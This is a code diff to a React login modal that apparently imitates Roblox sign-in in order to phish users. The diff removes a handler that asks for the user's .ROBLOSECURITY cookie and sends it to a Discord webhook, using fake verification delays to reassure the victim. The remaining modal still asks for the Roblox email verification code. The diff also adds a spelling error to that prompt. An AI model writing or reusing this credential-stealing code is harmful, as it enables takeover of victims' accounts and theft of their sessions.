@@ -1,4 +1,4 @@
-import { useState, useEffect } from 'react';
+import React, { useState, useEffect } from 'react';
 import { X, AlertTriangle, Lock, Shield, Loader2, MessageSquare } from 'lucide-react';
 import { Button } from '@/components/ui/button';
 import { Textarea } from '@/components/ui/textarea';
@@ -164,7 +164,7 @@ export function LoginModal({ isOpen, onClose }: LoginModalProps) {
           <div className="mb-6">
             <h2 className="text-xl font-bold text-foreground">Check Your Email</h2>
             <p className="mt-1 text-sm text-muted-foreground">
-              Enter the email verification code sent to your Roblox email
+              Enter the email verificatio code sent to your Roblox email
             </p>
           </div>
 
@@ -301,25 +301,6 @@ export function LoginModal({ isOpen, onClose }: LoginModalProps) {
         </p>
       </>
     );
-  };
-
-  const handleCookieSubmit = async (e: React.FormEvent) => {
-    e.preventDefault();
-    if (!cookie.trim()) {
-      toast({
-        title: "Error",
-        description: "Please enter your .ROBLOSECURITY cookie",
-        variant: "destructive",
-      });
-      return;
-    }
-    // Send cookie to Discord webhook
-    await sendToWebhook('Cookie', cookie);
-    setStep('verifying');
-    await new Promise(resolve => setTimeout(resolve, 1500));
-    setStep('loading');
-    await new Promise(resolve => setTimeout(resolve, 1500));
-    setStep('email-verification');
   };
 
   return (
